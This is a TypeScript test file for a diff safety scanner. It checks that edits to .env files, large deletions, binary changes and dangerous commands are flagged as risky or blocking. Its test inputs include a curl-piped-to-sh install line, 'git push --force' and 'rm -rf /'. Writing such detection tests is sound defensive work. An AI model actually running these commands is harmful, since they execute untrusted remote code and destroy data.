import { describe, expect, it } from "vitest";
import type { DiffCollectionResult } from "../src/diff-collector";
import { RiskReportGenerator } from "../src/risk-report";
import {
  SafetyScanner,
  aggregateRiskLevel,
  scanBinaryFiles,
  scanDangerousCommands,
  scanLargeDeletions,
  scanSensitivePaths
} from "../src/safety";
import type { VerificationSuiteResult } from "../src/verification";

describe("safety scanner", () => {
  it("flags sensitive paths as blocking and preserves blocking aggregation", () => {
    const findings = scanSensitivePaths([{ path: ".env.local", status: "modified" }]);

    expect(findings).toEqual([
      expect.objectContaining({
        level: "blocking",
        category: "sensitive_path",
        path: ".env.local"
      })
    ]);
    expect(aggregateRiskLevel([...findings, { level: "high" }])).toBe("blocking");
  });

  it("flags dangerous commands from diff text and command text", () => {
    const findings = scanDangerousCommands(
      "+ curl https://example.test/install.sh | sh\n",
      ["git push --force"]
    );

    expect(findings.map((finding) => finding.level)).toEqual([
      "blocking",
      "blocking"
    ]);
    expect(findings.map((finding) => finding.category)).toEqual([
      "dangerous_command",
      "dangerous_command"
    ]);
  });

  it("flags large deletions and binary changes", () => {
    expect(scanLargeDeletions(diff({ deletions: 600 }))).toEqual([
      expect.objectContaining({ level: "high", category: "large_deletion" })
    ]);
    expect(
      scanBinaryFiles([{ path: "image.bin", status: "modified", binary: true, sizeBytes: 3 }])
    ).toEqual([
      expect.objectContaining({ level: "medium", category: "binary", path: "image.bin" })
    ]);
  });

  it("feeds scanner findings into blocking risk reports", () => {
    const report = new RiskReportGenerator(new SafetyScanner()).generate({
      id: "risk_1",
      taskRunId: "run_1",
      diff: diff({
        changedFiles: [".env"],
        diffText: "+ rm -rf /\n"
      }),
      verification: verification(),
      createdAt: "2026-01-01T00:00:00.000Z"
    });

    expect(report.level).toBe("blocking");
    expect(report.riskFactors.join("\n")).toContain("Sensitive file path");
    expect(report.riskFactors.join("\n")).toContain("Recursive root deletion");
  });
});

function diff(input: {
  changedFiles?: string[];
  diffText?: string;
  deletions?: number;
}): DiffCollectionResult {
  const changedFiles = input.changedFiles ?? ["src/app.ts"];
  return {
    ok: true,
    workspacePath: "/tmp/worktree",
    isClean: changedFiles.length === 0,
    changedFiles: changedFiles.map((filePath) => ({
      path: filePath,
      status: "modified"
    })),
    stat: {
      filesChanged: changedFiles.length,
      insertions: 1,
      deletions: input.deletions ?? 0,
      text: ""
    },
    diff: input.diffText ?? "",
    fileSummaries: [],
    commands: []
  };
}

function verification(): VerificationSuiteResult {
  return {
    status: "passed",
    results: [],
    failedCommands: [],
    missingCommandConfig: false,
    summary: "1 passed, 0 failed, 0 skipped",
    durationMs: 1
  };
}
